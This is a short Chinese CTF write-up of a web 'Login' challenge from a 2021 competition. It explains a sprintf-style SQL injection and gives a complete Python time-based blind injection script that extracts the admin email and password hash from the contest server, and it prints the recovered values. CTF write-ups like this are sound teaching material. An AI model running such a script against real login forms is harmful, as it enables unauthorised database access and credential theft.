# 领航杯 2021 Web



# Login

左下角发现登录，bp抓包发现查询语句：

```sql
select email,password from users where email = ('') and password =''
```

经过fuzz发现传`%`会出问题，很明显的sprintf的SQL注入漏洞。直接写个脚本跑一下就可以了：

```python
import requests
def strtohex(s):
    ss = "0x"
    for i in s:
        ss +=  str(hex(ord(i))).replace("0x",'')
    return ss


url="http://pk.cnhongke.net:20211/login.php"


flag=''
for i in range(1,100000):
    for j in "abcdefghijklmnopqrstuvwxyz0123456789-{}.@_":

        payload=")||if((select group_concat(email) like {}),sleep(0.5),1)#".format(strtohex(flag+j+"%"))
        #payload=")||if((select group_concat(password) like {}),sleep(0.5),1)#".format(strtohex(flag+j+"%"))


        #print(payload)
        data={
            'password':payload,
            'username':"%1$",
            'subl':"OK"
        }
        try:
            r=requests.post(url=url,data=data,timeout=0.5)
            #print(r.text)
        except:
            flag+=j
            print(flag)
            break
"admin@admin.com"
"9bf49267cc9c8a5428a3576ebce59b6b"
```

登录即可得到flag。